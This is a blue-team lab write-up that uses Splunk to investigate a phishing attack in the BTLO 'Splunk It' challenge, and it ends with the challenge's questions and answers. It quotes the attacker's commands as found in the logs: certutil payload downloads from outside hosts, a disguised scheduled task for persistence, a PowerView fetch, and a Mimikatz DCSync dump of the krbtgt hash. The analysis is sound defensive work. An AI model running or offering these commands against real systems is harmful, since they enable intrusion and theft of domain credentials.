---
layout: lab
title: Splunk It
platform: BTLO
difficulty: Easy
category: Incident Response
skill: Incident Response
tools: " Splunk BTL1"
tactics: Credential Access, Collection
proof: https://blueteamlabs.online/achievement/share/144656/195
challenge_url: https://blueteamlabs.online/home/investigation/splunk-it-0aae63055a
permalink: /blue-team/labs/splunkit/
summary: '"One of the employees clicked on a malicious link and got the endpoint compromised. After executing malicious files and getting a foothold, the attacker compromised the AD by dumping sensitive information. "'
art: https://blueteamlabs.online/storage/labs/8e110194c3000089ab097ca6915c85ae966c6e5b.png
type:
points:
youtube: https://www.youtube.com/watch?v=2DF7wNC9r9k
---
---
## Overview

An employee opened a malicious Invoice document, enabling macros and triggering a full attack chain. Starting from an initial phishing foothold, the attacker used certutil to pull down a payload, established persistence via a scheduled task disguised as a Microsoft Teams update, performed AD reconnaissance with PowerView, then dumped domain credentials using Mimikatz DCSync targeting the krbtgt account.

---

## Investigation

### Initial Access — Invoice Phishing

Searching across all indexes for activity related to the Invoice document:

```zsh
index=* "invoice"
```
Sysmon logs show the Invoice document was opened from the Downloads directory, with a Trusted Documents registry entry confirming the user enabled macros. The file was downloaded from:
`139[.]59[.]21[.]147:8080`
![splunkit_invoice.png](splunkit_invoice.png)

### Payload Delivery — certutil Download

Following macro execution, the attacker used `certutil.exe` to pull down a secondary payload — a classic LOLBAS technique to bypass download restrictions:
```
cmd.exe /c certutil -urlcache -split -f "hxxp[://]24[.]199[.]117[.]142:1337/svchost.exe" "C:\Windows\Temp\svchost.exe"
````

The file was saved to `C:\Windows\Temp\svchost.exe` — masquerading as a legitimate Windows process name.
![splunkit_svvhost.png](splunkit_svvhost.png)
### Compromised User

All malicious activity traces back to domain user `CYBERRANGE\ricksanchez`.

### Persistence — Scheduled Task

Filtering Sysmon process creation events for ricksanchez and schtasks:

```bash
index=* User="CYBERRANGE\\ricksanchez" "schtasks.exe"
```

The attacker created a scheduled task set to run at logon, launching the previously dropped `svchost.exe` from Temp:
```
schtasks.exe /create /tn "Microsoft Teams Updater" /sc onlogon /tr C:\Windows\Temp\svchost.exe
````

Task name **Microsoft Teams Updater** — designed to blend in with legitimate Microsoft software. T1053.005.
![splunkit_schtask.png](splunkit_schtask.png)

### Reconnaissance — PowerView

Searching for PowerShell script execution under ricksanchez:

bash

```bash
index=* User="CYBERRANGE\\ricksanchez" ".ps1"
```

The attacker pulled PowerView directly from the PowerSploit GitHub repo using certutil:
```
certutil.exe -urlcache -f https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 PowerView.ps1
```

PowerView is the go-to AD enumeration script — used here to map the domain prior to credential dumping. T1059.001.
![splunkit_powerview.png](splunkit_powerview.png)

### Credential Dumping — Mimikatz DCSync

The same `.ps1` search surfaced Mimikatz execution. The attacker ran Invoke-Mimikatz with the DCSync module targeting the `krbtgt` account:
```
powershell.exe . .\Invoke-Mimikatz.ps1 ; Invoke-Mimikatz -Command '"lsadump::dcsync /domain:CYBERRANGE.local /user:krbtgt"'
````
![splunkit_mimikat.png](splunkit_mimikat.png)
DCSync (T1003.006) impersonates a domain controller and requests password replication — dumping the krbtgt hash without ever touching LSASS directly. With krbtgt compromised, the attacker has everything needed for a Golden Ticket attack.
![splunkit_dcsync.png](splunkit_dcsync.png)


---

## MITRE ATT&CK

|Tactic|Technique|Description|
|---|---|---|
|Initial Access|T1566.001|Phishing — malicious Invoice document|
|Execution|T1059.001|PowerShell — macro execution, PowerView, Mimikatz|
|Defense Evasion|T1036.005|Masquerading — svchost.exe in C:\Windows\Temp|
|Defense Evasion|T1140|Deobfuscate/Decode — certutil -urlcache download|
|Persistence|T1053.005|Scheduled Task — Microsoft Teams Updater|
|Discovery|T1482|Domain Trust Discovery — PowerView|
|Discovery|T1069.002|Domain Groups — PowerView AD enumeration|
|Credential Access|T1003.006|DCSync — krbtgt hash via Mimikatz|
|Command & Control|T1105|Ingress Tool Transfer — certutil payload delivery|

## IOCs

|Type|Value|
|---|---|
|IP|139[.]59[.]21[.]147|
|IP|24[.]199[.]117[.]142|
|URL|hxxp[://]139[.]59[.]21[.]147:8080|
|URL|hxxp[://]24[.]199[.]117[.]142:1337/svchost.exe|
|File|C:\Windows\Temp\svchost.exe|
|File|C:\Windows\Temp\PowerView.ps1|
|File|C:\Windows\Temp\Invoke-Mimikatz.ps1|
|Scheduled Task|Microsoft Teams Updater|
|Domain User|CYBERRANGE\ricksanchez|



---

{% include flag.html question="Did one of the employees inform you about a recent phishing email they received named "Invoice" during the investigation? Can you locate the IP address from which the file was downloaded?" answer="139.59.21.147:8080" %}

{% include answer.html question="What is the file that was downloaded after the malicious document was opened? Please provide the complete path where the file was downloaded and saved" answer="C:\Windows\Temp\svchost.exe" %}

{% include flag.html question="What is the URL from which additional file were being downloaded?" answer="http://24.199.117.142:1337/svchost.exe" %}

{% include answer.html question="Which domain user seemed to be compromised?" answer="ricksanchez" %}

{% include flag.html question="Could you check if there were any persistent actions detected? Please name the program utilized" answer="schtasks.exe" %}

{% include answer.html question="What is the name of the task employed for maintaining persistence?" answer="Microsoft Teams Updater" %}

{% include flag.html question="What famous script, commonly used by attackers, was dropped as an additional file to facilitate internal reconnaissance and enumeration?" answer="PowerView.ps1" %}

{% include answer.html question="What additional file was deployed by the attacker to extract credentials?" answer="Invoke-Mimikatz.ps1" %}

{% include flag.html question="What technique for credential dumping, similar to a known method often used in domain controller environments, was employed by the attacker?" answer="DCSync" %}
